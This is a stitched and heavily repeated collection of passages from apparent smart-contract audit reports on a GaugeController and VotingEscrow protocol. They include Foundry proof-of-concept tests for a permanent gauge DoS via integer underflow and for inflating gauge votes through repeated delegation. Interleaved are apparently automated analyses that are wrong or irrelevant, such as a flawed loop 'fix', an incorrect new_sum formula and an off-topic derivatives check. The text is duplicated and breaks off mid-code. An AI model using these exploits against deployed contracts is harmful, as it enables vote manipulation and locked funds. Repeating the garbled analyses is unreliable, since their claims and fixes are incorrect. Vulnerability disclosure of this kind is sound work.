gc.add_gauge(gauge1);\n        gc.change_gauge_weight(gauge1, 0);\n        vm.stopPrank();\n\n        // `user1` pays some money and adds his power to `gauge1`\n        vm.startPrank(user1);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        vm.warp(block.timestamp + 10 weeks);\n        gc.checkpoint_gauge(gauge1);\n        vm.stopPrank();\n\n        // `user2` does the same\n        vm.startPrank(user2);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        vm.warp(block.timestamp + 1 weeks);\n        gc.checkpoint_gauge(gauge1);\n        vm.stopPrank();\n\n        vm.warp(block.timestamp + 1825 days - 14 weeks);\n        vm.startPrank(gov);\n        // weight is changed to `0`, just to simplify\n        // normally, weight would just be decreased here and then subsequently decreased by users when their\n        // locking period is over until it finally drops to `0`\n        // alternatively, some whale can frontrun a call to `change_gauge_weight` as described and then\n        // withdraw his voting power leaving the gauge with `0` slope and `0` bias\n        gc.change_gauge_weight(gauge1, 0);\n        vm.warp(block.timestamp + 1 weeks);\n        \n        // now, weight is changed to some bigger value\n        gc.change_gauge_weight(gauge1, 1 ether);\n        vm.stopPrank();\n        // some time passes so that user1's locking period ends\n        vm.warp(block.timestamp + 5 weeks);\n        \n        // `user2` cannot change his weight although his `locked.end` is big enough\n        vm.prank(user2);\n        vm.expectRevert(stdError.arithmeticError);\n        gc.vote_for_gauge_weights(gauge1, 0);\n\n        // governance cannot change weight\n        vm.startPrank(gov);\n        vm.expectRevert(stdError.arithmeticError);\n        gc.change_gauge_weight(gauge1, 2 ether);\n        \n        // governance cannot even remove the gauge\n        // it's now impossible to do anything on gauge1\n        vm.expectRevert(stdError.arithmeticError);\n        gc.remove_gauge(gauge1);\n        vm.stopPrank();\n    }\n```\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nPerform `pt.slope -= d_slope` in `_get_weight` only when `pt.slope >= d.slope` and otherwise zero it out.\n\n\n\n\n\n## Assessed type\n\nUnder/Overflow",

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

It contains the following loop:\n```solidity\n            for (uint256 i; i < 500; ++i) {\n                if (t > block.timestamp) break;\n                t += WEEK;\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n                    pt.bias = 0;\n                    pt.slope = 0;\n                }\n                points_weight[_gauge_addr][t] = pt;\n                if (t > block.timestamp) time_weight[_gauge_addr] = t;\n            }\n```\n\nThere are two possible scenarios:\n- `pt.bias > d_bias`\n- `pt.bias <= d_bias`\n\nThe first scenario will always happen naturally, since `pt.bias` will be the total voting power allocated for some point and since slope is a sum of all users' slopes and slopes are calculated in such a way that `<SLOPE> * <TIME_TO_END_OF_STAKING_PERIOD> = <INITIAL_BIAS>`.\n\nHowever, it is possible to artificially change `points_weight[_gauge_addr][t].bias` by calling `change_gauge_weight` (which can be only called by the governance). It important to notice here, that `change_gauge_weight` **doesn't modify** `points_weight[_gauge_addr][t].slope`\n\n`change_gauge_weight` does permit to change the weight to a smaller number than its current value, so it's both perfectly legal and possible that governance does this at some point (it could be changing the weight to `0` or any other value smaller than the current one).\n\nThen, at some point when `_get_weight` is called, we will enter the `else` block because `pt.bias` will be less than the sum of all user's biases (since originally these values were equal, but `pt.bias` was lowered by the governance). It will set `pt.bias` and `pt.slope` to `0`.\n\nAfter some time, the governance may realise that the gauge's weight is `0`, but should be bigger and may change it to some bigger value.\n\nWe will have the situation where `points_weight[_gauge_addr][t].slope = 0` and `points_weight[_gauge_addr][t].bias > 0`.\n\nIf this happens and there is any nonzero `changes_weight[_gauge_addr]` not yet taken into account (for instance in the week after the governance update), then all the functions related to the gauge at `_gauge_addr` will not work.\n\nIt's because, the following functions:\n- `checkpoint_gauge`\n- `gauge_relative_weight_write`\n- `gauge_relative_weight`\n- `_change_gauge_weight`\n- `change_gauge_weight`\n- `vote_for_gauge_weights`\n- `remove_gauge`\n\ncall `_get_weight` at some point.\n\nLet's see what will happen in `_get_weight` when it's called:\n```solidity\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n```\n\nWe will enter the `if` statement, because `pt.bias` will be `> 0` and `pt.slope` will be `0` (or some small value, if users give their voting power to gauge in the meantime), since it was previously set to `0` in the `else` statement and wasn't touched when gauge's weight was changed by the governance. We will:\n- subtract `d_bias` from `pt.bias` which will succeed\n- attempt to subtract `changes_weight[_gauge_addr][t]` from `d_slope`\n\nHowever, there could be a user (or users) whose voting power allocation finishes at `t` for some `t` not yet handled. It means that `changes_weight[_gauge_addr][t] > 0` (and if `pt.slope` is not `0`, then `changes_weight[_gauge_addr][t]` still may be greater than it). \n\nIf this happens, then the integer underflow will happen in `pt.slope -= d_slope;`. It will now happen in **every** call to `_get_weight` and it won't be possible to recover, because:\n- `vote_for_gauge_weights` will revert\n- `change_gauge_weight` will revert\n\nas they call `_get_weight` internally. So, it won't be possible to modify `pt.slope` and `pt.bias` for any point in time, so the `revert` will always happen for that gauge. It won't even be possible to remove that gauge.\n\nSo, in short, the scenario is as follows:\n1. Users allocate their voting power to a gauge `X`.\n2. Governance at some point decreases the weight of `X`.\n3. Users withdraw their voting power as the time passes, and finally the weight of `X` drops to `0`.\n4. Governance realises this and increases weight of `X` since it wants to incentivise users to provide liquidity in `X`.\n5. Voting power delegation of some user(s) ends some time after that and `_get_weight` attempts to subtract `changes_weight[_gauge_addr][t]` from the current slope (which is either `0` or some small value) and it results in integer underflow.\n6. `X` is unusable and it's impossible to withdraw voting power from (so users cannot give their voting power somewhere else). The weight of `X` cannot be changed anymore and `X` cannot be even removed.\n\n**Note that it is also possible to frontrun the call to `change_gauge_weight` when the weight is set to a lower value** - user with a lot of capital can watch the mempool and if weight is lowered to some value `x`, he can give a voting power of `x` to that gauge. Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight = `0`. Then, governance will manually increase the weight to recover and DoS will happen as described. **So it is only needed that governance decreases gauge's weight at some point**.\n\n## Impact\nAs stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.\n\nIn order for this situation to succeed, governance has to decrease weight of some gauge, but I think it's very likely, because:\n1. `_get_weight` checks that `if (pt.bias > d_bias)` and it handles the opposite situation, so it is anticipated that it may genuinely happen.\n2. It is definitely possible to decrease gauge's weight and it's even possible to zero it out (as in the `remove_gauge`).\n3. The situation where `old_bias` is greater than `old_sum_bias + new_bias` is handled in `vote_for_gauge_weights`, but it may only happen when gauge's weight was decreased by the governance.\n4. The situation where `old_slope.slope` is greater than `old_sum_slope + new_slope.slope` is also handled there, but it may only happen if we enter the `else` statement in `_get_weight`.\n\nSo, it is predicted that gauge's weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so. Hence, I believe that this finding is of High severity, because although it requires governance to perform some action (decrease weight of some gauge), I believe that it's likely that governance decides to decrease weight, especially that it is anticipated in the code and edge cases are handled there (and they wouldn't be if we assumed that governance would never allowed them to happen).\n\n## Proof of Concept\nPlease run the test below. The test shows slightly simplified situation where governance just sets weight to `0` for `gauge1`, but as I've described above, it suffices that it's just changed to a smaller value and it may drop to `0` naturally as users withdraw their voting power. The following import will also have to be added: `import {Test, stdError} from \"forge-std/Test.sol\";`.\n\n```solidity\nfunction testPoC1() public\n    {\n        // gauge is being set up\n        vm.startPrank(gov);\n        gc.add_gauge(gauge1);\n        gc.change_gauge_weight(gauge1, 0);\n        vm.stopPrank();\n\n        // `user1` pays some money and adds his power to `gauge1`\n        vm.startPrank(user1);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        vm.warp(block.timestamp + 10 weeks);\n        gc.checkpoint_gauge(gauge1);\n        vm.stopPrank();\n\n        // `user2` does the same\n        vm.startPrank(user2);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        vm.warp(block.timestamp + 1 weeks);\n        gc.checkpoint_gauge(gauge1);\n        vm.stopPrank();\n\n        vm.warp(block.timestamp + 1825 days - 14 weeks);\n        vm.startPrank(gov);\n        // weight is changed to `0`, just to simplify\n        // normally, weight would just be decreased here and then subsequently decreased by users when their\n        // locking period is over until it finally drops to `0`\n        // alternatively, some whale can frontrun a call to `change_gauge_weight` as described and then\n        // withdraw his voting power leaving the gauge with `0` slope and `0` bias\n        gc.change_gauge_weight(gauge1, 0);\n        vm.warp(block.timestamp + 1 weeks);\n        \n        // now, weight is changed to some bigger value\n        gc.change_gauge_weight(gauge1, 1 ether);\n        vm.stopPrank();\n        // some time passes so that user1's locking period ends\n        vm.warp(block.timestamp + 5 weeks);\n        \n        // `user2` cannot change his weight although his `locked.end` is big enough\n        vm.prank(user2);\n        vm.expectRevert(stdError.arithmeticError);\n        gc.vote_for_gauge_weights(gauge1, 0);\n\n        // governance cannot change weight\n        vm.startPrank(gov);\n        vm.expectRevert(stdError.arithmeticError);\n        gc.change_gauge_weight(gauge1, 2 ether);\n        \n        // governance cannot even remove the gauge\n        // it's now impossible to do anything on gauge1\n        vm.expectRevert(stdError.arithmeticError);\n        gc.remove_gauge(gauge1);\n        vm.stopPrank();\n    }\n```\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nPerform `pt.slope -= d_slope` in `_get_weight` only when `pt.slope >= d.slope` and otherwise zero it out.\n\n\n\n\n\n## Assessed type\n\nUnder/Overflow",

This means that the loop will always break at the first iteration, because the value of t is always greater than the current block timestamp at the beginning of the function. As a result, the loop will never iterate more than once, and the weight update process will not function as intended.\n\nAdditionally, the function has a miscalculation issue in the following lines:\n\nif (pt.bias > d_bias) {\npt.bias -= d_bias;\nuint256 d_slope = changes_weight[_gauge_addr][t];\npt.slope -= d_slope;\n}\n\nHere, the function calculates the new bias value by subtracting the d_bias value, but it does not update the value of t to reflect the new timestamp after the bias and slope have been updated. This means that the function will always use the same timestamp for the next iteration of the loop, which can lead to incorrect weight calculations.\n\nTo fix this vulnerability, the conditional check in the for-loop should be changed to:\n\nif (block.timestamp > t + WEEK) break;\n\nAnd the miscalculation issue should be fixed by updating the value of t after the bias and slope have been updated:\n\nif (pt.bias > d_bias) {\npt.bias -= d_bias;\nuint256 d_slope = changes_weight[_gauge_addr][t];\npt.slope -= d_slope;\nt += WEEK;\npoints_weight[_gauge_addr][t] = pt;\n}\n\nThese changes will ensure that the loop iterates the correct number of times and that the weight update process functions as intended.",

If the `t` variable is intended to represent a timestamp, it should be checking if `t < block.timestamp` instead. Currently, if `t` is ever equal to `block.timestamp`, the loop will break prematurely.\n\n2. Miscalculation: In the calculation of `d_bias`, the variable `pt.slope` is multiplied by a constant `WEEK`. If the `pt.slope` variable is not intended to be used with a time-based multiplier, this could lead to incorrect calculations in the weight update process.\n\n3.

There is no indication of the smart contract managing multiple derivative assets or having the functionality to update the weight of a derivative. However, I will evaluate based on the given vulnerability knowledge that the smart contract has the functionality to update the weight of a derivative but lacks the ability to remove a malfunctioning or untrusted derivative.\n\nThe code does not show any signs of handling multiple derivatives or allowing the admin to remove or update derivatives.

Therefore, the vulnerability described in the given knowledge is not applicable to this code snippet.\n\nHowever, if the smart contract contains additional functionalities that manage multiple derivatives, allow updating derivatives' weights, and lack the ability to remove malfunctioning or untrusted derivatives, it could be vulnerable. In that case, the smart contract should be updated to include a function that enables the admin to remove an existing derivative, as described in the vulnerability knowledge.\n\nIn conclusion, the given code snippet does not show any signs of vulnerability based on the provided knowledge.

It contains the following loop:\n```solidity\n            for (uint256 i; i < 500; ++i) {\n                if (t > block.timestamp) break;\n                t += WEEK;\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n                    pt.bias = 0;\n                    pt.slope = 0;\n                }\n                points_weight[_gauge_addr][t] = pt;\n                if (t > block.timestamp) time_weight[_gauge_addr] = t;\n            }\n```\n\nThere are two possible scenarios:\n- `pt.bias > d_bias`\n- `pt.bias <= d_bias`\n\nThe first scenario will always happen naturally, since `pt.bias` will be the total voting power allocated for some point and since slope is a sum of all users' slopes and slopes are calculated in such a way that `<SLOPE> * <TIME_TO_END_OF_STAKING_PERIOD> = <INITIAL_BIAS>`.\n\nHowever, it is possible to artificially change `points_weight[_gauge_addr][t].bias` by calling `change_gauge_weight` (which can be only called by the governance). It important to notice here, that `change_gauge_weight` **doesn't modify** `points_weight[_gauge_addr][t].slope`\n\n`change_gauge_weight` does permit to change the weight to a smaller number than its current value, so it's both perfectly legal and possible that governance does this at some point (it could be changing the weight to `0` or any other value smaller than the current one).\n\nThen, at some point when `_get_weight` is called, we will enter the `else` block because `pt.bias` will be less than the sum of all user's biases (since originally these values were equal, but `pt.bias` was lowered by the governance). It will set `pt.bias` and `pt.slope` to `0`.\n\nAfter some time, the governance may realise that the gauge's weight is `0`, but should be bigger and may change it to some bigger value.\n\nWe will have the situation where `points_weight[_gauge_addr][t].slope = 0` and `points_weight[_gauge_addr][t].bias > 0`.\n\nIf this happens and there is any nonzero `changes_weight[_gauge_addr]` not yet taken into account (for instance in the week after the governance update), then all the functions related to the gauge at `_gauge_addr` will not work.\n\nIt's because, the following functions:\n- `checkpoint_gauge`\n- `gauge_relative_weight_write`\n- `gauge_relative_weight`\n- `_change_gauge_weight`\n- `change_gauge_weight`\n- `vote_for_gauge_weights`\n- `remove_gauge`\n\ncall `_get_weight` at some point.\n\nLet's see what will happen in `_get_weight` when it's called:\n```solidity\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n```\n\nWe will enter the `if` statement, because `pt.bias` will be `> 0` and `pt.slope` will be `0` (or some small value, if users give their voting power to gauge in the meantime), since it was previously set to `0` in the `else` statement and wasn't touched when gauge's weight was changed by the governance. We will:\n- subtract `d_bias` from `pt.bias` which will succeed\n- attempt to subtract `changes_weight[_gauge_addr][t]` from `d_slope`\n\nHowever, there could be a user (or users) whose voting power allocation finishes at `t` for some `t` not yet handled. It means that `changes_weight[_gauge_addr][t] > 0` (and if `pt.slope` is not `0`, then `changes_weight[_gauge_addr][t]` still may be greater than it). \n\nIf this happens, then the integer underflow will happen in `pt.slope -= d_slope;`. It will now happen in **every** call to `_get_weight` and it won't be possible to recover, because:\n- `vote_for_gauge_weights` will revert\n- `change_gauge_weight` will revert\n\nas they call `_get_weight` internally. So, it won't be possible to modify `pt.slope` and `pt.bias` for any point in time, so the `revert` will always happen for that gauge. It won't even be possible to remove that gauge.\n\nSo, in short, the scenario is as follows:\n1. Users allocate their voting power to a gauge `X`.\n2. Governance at some point decreases the weight of `X`.\n3. Users withdraw their voting power as the time passes, and finally the weight of `X` drops to `0`.\n4. Governance realises this and increases weight of `X` since it wants to incentivise users to provide liquidity in `X`.\n5. Voting power delegation of some user(s) ends some time after that and `_get_weight` attempts to subtract `changes_weight[_gauge_addr][t]` from the current slope (which is either `0` or some small value) and it results in integer underflow.\n6. `X` is unusable and it's impossible to withdraw voting power from (so users cannot give their voting power somewhere else). The weight of `X` cannot be changed anymore and `X` cannot be even removed.\n\n**Note that it is also possible to frontrun the call to `change_gauge_weight` when the weight is set to a lower value** - user with a lot of capital can watch the mempool and if weight is lowered to some value `x`, he can give a voting power of `x` to that gauge. Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight = `0`. Then, governance will manually increase the weight to recover and DoS will happen as described. **So it is only needed that governance decreases gauge's weight at some point**.\n\n## Impact\nAs stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.\n\nIn order for this situation to succeed, governance has to decrease weight of some gauge, but I think it's very likely, because:\n1. `_get_weight` checks that `if (pt.bias > d_bias)` and it handles the opposite situation, so it is anticipated that it may genuinely happen.\n2. It is definitely possible to decrease gauge's weight and it's even possible to zero it out (as in the `remove_gauge`).\n3. The situation where `old_bias` is greater than `old_sum_bias + new_bias` is handled in `vote_for_gauge_weights`, but it may only happen when gauge's weight was decreased by the governance.\n4. The situation where `old_slope.slope` is greater than `old_sum_slope + new_slope.slope` is also handled there, but it may only happen if we enter the `else` statement in `_get_weight`.\n\nSo, it is predicted that gauge's weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so. Hence, I believe that this finding is of High severity, because although it requires governance to perform some action (decrease weight of some gauge), I believe that it's likely that governance decides to decrease weight, especially that it is anticipated in the code and edge cases are handled there (and they wouldn't be if we assumed that governance would never allowed them to happen).\n\n## Proof of Concept\nPlease run the test below. The test shows slightly simplified situation where governance just sets weight to `0` for `gauge1`, but as I've described above, it suffices that it's just changed to a smaller value and it may drop to `0` naturally as users withdraw their voting power. The following import will also have to be added: `import {Test, stdError} from \"forge-std/Test.sol\";`.\n\n```solidity\nfunction testPoC1() public\n    {\n        // gauge is being set up\n        vm.startPrank(gov);\n        gc.add_gauge(gauge1);\n        gc.change_gauge_weight(gauge1, 0);\n        vm.stopPrank();\n\n        // `user1` pays some money and adds his power to `gauge1`\n        vm.startPrank(user1);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        vm.warp(block.timestamp + 10 weeks);\n        gc.checkpoint_gauge(gauge1);\n        vm.stopPrank();\n\n        // `user2` does the same\n        vm.startPrank(user2);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        vm.warp(block.timestamp + 1 weeks);\n        gc.checkpoint_gauge(gauge1);\n        vm.stopPrank();\n\n        vm.warp(block.timestamp + 1825 days - 14 weeks);\n        vm.startPrank(gov);\n        // weight is changed to `0`, just to simplify\n        // normally, weight would just be decreased here and then subsequently decreased by users when their\n        // locking period is over until it finally drops to `0`\n        // alternatively, some whale can frontrun a call to `change_gauge_weight` as described and then\n        // withdraw his voting power leaving the gauge with `0` slope and `0` bias\n        gc.change_gauge_weight(gauge1, 0);\n        vm.warp(block.timestamp + 1 weeks);\n        \n        // now, weight is changed to some bigger value\n        gc.change_gauge_weight(gauge1, 1 ether);\n        vm.stopPrank();\n        // some time passes so that user1's locking period ends\n        vm.warp(block.timestamp + 5 weeks);\n        \n        // `user2` cannot change his weight although his `locked.end` is big enough\n        vm.prank(user2);\n        vm.expectRevert(stdError.arithmeticError);\n        gc.vote_for_gauge_weights(gauge1, 0);\n\n        // governance cannot change weight\n        vm.startPrank(gov);\n        vm.expectRevert(stdError.arithmeticError);\n        gc.change_gauge_weight(gauge1, 2 ether);\n        \n        // governance cannot even remove the gauge\n        // it's now impossible to do anything on gauge1\n        vm.expectRevert(stdError.arithmeticError);\n        gc.remove_gauge(gauge1);\n        vm.stopPrank();\n    }\n```\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nPerform `pt.slope -= d_slope` in `_get_weight` only when `pt.slope >= d.slope` and otherwise zero it out.\n\n\n\n\n\n## Assessed type\n\nUnder/Overflow",

Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight = `0`. Then, governance will manually increase the weight to recover and DoS will happen as described. **So it is only needed that governance decreases gauge's weight at some point**.\n\n## Impact\nAs stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.\n\nIn order for this situation to succeed, governance has to decrease weight of some gauge, but I think it's very likely, because:\n1. `_get_weight` checks that `if (pt.bias > d_bias)` and it handles the opposite situation, so it is anticipated that it may genuinely happen.\n2. It is definitely possible to decrease gauge's weight and it's even possible to zero it out (as in the `remove_gauge`).\n3. The situation where `old_bias` is greater than `old_sum_bias + new_bias` is handled in `vote_for_gauge_weights`, but it may only happen when gauge's weight was decreased by the governance.\n4. The situation where `old_slope.slope` is greater than `old_sum_slope + new_slope.slope` is also handled there, but it may only happen if we enter the `else` statement in `_get_weight`.\n\nSo, it is predicted that gauge's weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so. Hence, I believe that this finding is of High severity, because although it requires governance to perform some action (decrease weight of some gauge), I believe that it's likely that governance decides to decrease weight, especially that it is anticipated in the code and edge cases are handled there (and they wouldn't be if we assumed that governance would never allowed them to happen).\n\n## Proof of Concept\nPlease run the test below. The test shows slightly simplified situation where governance just sets weight to `0` for `gauge1`, but as I've described above, it suffices that it's just changed to a smaller value and it may drop to `0` naturally as users withdraw their voting power.

The calculation should be `new_sum = old_sum + _weight` instead of `new_sum = old_sum + _weight - old_gauge_weight`. This error might lead to incorrect weight updates and erroneous results.\n\nTo demonstrate the vulnerability, here is a Proof of Concept (PoC):\n\n1. Assume that the `_gauge` variable contains an address with an existing weight, and the `_weight` variable is set to a value, e.g., `_weight = 100`.\n2. Assume that the `old_sum` value is 200, and the `old_gauge_weight` value is also 100.\n3. When executing the `_change_gauge_weight` function, the `new_sum` variable is calculated as `new_sum = old_sum + _weight - old_gauge_weight`, resulting in a value of `new_sum = 200 + 100 - 100 = 200`.\n4. However, the expected calculation should be `new_sum = old_sum + _weight`, resulting in a value of `new_sum = 200 + 100 = 300`.\n\nThe incorrect calculation in the `_change_gauge_weight` function can lead to unexpected behavior and inconsistent results in the smart contract.

It contains the following loop:\n```solidity\n            for (uint256 i; i < 500; ++i) {\n                if (t > block.timestamp) break;\n                t += WEEK;\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n                    pt.bias = 0;\n                    pt.slope = 0;\n                }\n                points_weight[_gauge_addr][t] = pt;\n                if (t > block.timestamp) time_weight[_gauge_addr] = t;\n            }\n```\n\nThere are two possible scenarios:\n- `pt.bias > d_bias`\n- `pt.bias <= d_bias`\n\nThe first scenario will always happen naturally, since `pt.bias` will be the total voting power allocated for some point and since slope is a sum of all users' slopes and slopes are calculated in such a way that `<SLOPE> * <TIME_TO_END_OF_STAKING_PERIOD> = <INITIAL_BIAS>`.\n\nHowever, it is possible to artificially change `points_weight[_gauge_addr][t].bias` by calling `change_gauge_weight` (which can be only called by the governance). It important to notice here, that `change_gauge_weight` **doesn't modify** `points_weight[_gauge_addr][t].slope`\n\n`change_gauge_weight` does permit to change the weight to a smaller number than its current value, so it's both perfectly legal and possible that governance does this at some point (it could be changing the weight to `0` or any other value smaller than the current one).\n\nThen, at some point when `_get_weight` is called, we will enter the `else` block because `pt.bias` will be less than the sum of all user's biases (since originally these values were equal, but `pt.bias` was lowered by the governance). It will set `pt.bias` and `pt.slope` to `0`.\n\nAfter some time, the governance may realise that the gauge's weight is `0`, but should be bigger and may change it to some bigger value.\n\nWe will have the situation where `points_weight[_gauge_addr][t].slope = 0` and `points_weight[_gauge_addr][t].bias > 0`.\n\nIf this happens and there is any nonzero `changes_weight[_gauge_addr]` not yet taken into account (for instance in the week after the governance update), then all the functions related to the gauge at `_gauge_addr` will not work.\n\nIt's because, the following functions:\n- `checkpoint_gauge`\n- `gauge_relative_weight_write`\n- `gauge_relative_weight`\n- `_change_gauge_weight`\n- `change_gauge_weight`\n- `vote_for_gauge_weights`\n- `remove_gauge`\n\ncall `_get_weight` at some point.\n\nLet's see what will happen in `_get_weight` when it's called:\n```solidity\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n```\n\nWe will enter the `if` statement, because `pt.bias` will be `> 0` and `pt.slope` will be `0` (or some small value, if users give their voting power to gauge in the meantime), since it was previously set to `0` in the `else` statement and wasn't touched when gauge's weight was changed by the governance. We will:\n- subtract `d_bias` from `pt.bias` which will succeed\n- attempt to subtract `changes_weight[_gauge_addr][t]` from `d_slope`\n\nHowever, there could be a user (or users) whose voting power allocation finishes at `t` for some `t` not yet handled. It means that `changes_weight[_gauge_addr][t] > 0` (and if `pt.slope` is not `0`, then `changes_weight[_gauge_addr][t]` still may be greater than it). \n\nIf this happens, then the integer underflow will happen in `pt.slope -= d_slope;`. It will now happen in **every** call to `_get_weight` and it won't be possible to recover, because:\n- `vote_for_gauge_weights` will revert\n- `change_gauge_weight` will revert\n\nas they call `_get_weight` internally. So, it won't be possible to modify `pt.slope` and `pt.bias` for any point in time, so the `revert` will always happen for that gauge. It won't even be possible to remove that gauge.\n\nSo, in short, the scenario is as follows:\n1. Users allocate their voting power to a gauge `X`.\n2. Governance at some point decreases the weight of `X`.\n3. Users withdraw their voting power as the time passes, and finally the weight of `X` drops to `0`.\n4. Governance realises this and increases weight of `X` since it wants to incentivise users to provide liquidity in `X`.\n5. Voting power delegation of some user(s) ends some time after that and `_get_weight` attempts to subtract `changes_weight[_gauge_addr][t]` from the current slope (which is either `0` or some small value) and it results in integer underflow.\n6. `X` is unusable and it's impossible to withdraw voting power from (so users cannot give their voting power somewhere else). The weight of `X` cannot be changed anymore and `X` cannot be even removed.\n\n**Note that it is also possible to frontrun the call to `change_gauge_weight` when the weight is set to a lower value** - user with a lot of capital can watch the mempool and if weight is lowered to some value `x`, he can give a voting power of `x` to that gauge. Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight = `0`. Then, governance will manually increase the weight to recover and DoS will happen as described. **So it is only needed that governance decreases gauge's weight at some point**.\n\n## Impact\nAs stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.\n\nIn order for this situation to succeed, governance has to decrease weight of some gauge, but I think it's very likely, because:\n1. `_get_weight` checks that `if (pt.bias > d_bias)` and it handles the opposite situation, so it is anticipated that it may genuinely happen.\n2. It is definitely possible to decrease gauge's weight and it's even possible to zero it out (as in the `remove_gauge`).\n3. The situation where `old_bias` is greater than `old_sum_bias + new_bias` is handled in `vote_for_gauge_weights`, but it may only happen when gauge's weight was decreased by the governance.\n4. The situation where `old_slope.slope` is greater than `old_sum_slope + new_slope.slope` is also handled there, but it may only happen if we enter the `else` statement in `_get_weight`.\n\nSo, it is predicted that gauge's weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so. Hence, I believe that this finding is of High severity, because although it requires governance to perform some action (decrease weight of some gauge), I believe that it's likely that governance decides to decrease weight, especially that it is anticipated in the code and edge cases are handled there (and they wouldn't be if we assumed that governance would never allowed them to happen).\n\n## Proof of Concept\nPlease run the test below. The test shows slightly simplified situation where governance just sets weight to `0` for `gauge1`, but as I've described above, it suffices that it's just changed to a smaller value and it may drop to `0` naturally as users withdraw their voting power. The following import will also have to be added: `import {Test, stdError} from \"forge-std/Test.sol\";`.\n\n```solidity\nfunction testPoC1() public\n    {\n        // gauge is being set up\n        vm.startPrank(gov);\n        gc.add_gauge(gauge1);\n        gc.change_gauge_weight(gauge1, 0);\n        vm.stopPrank();\n\n   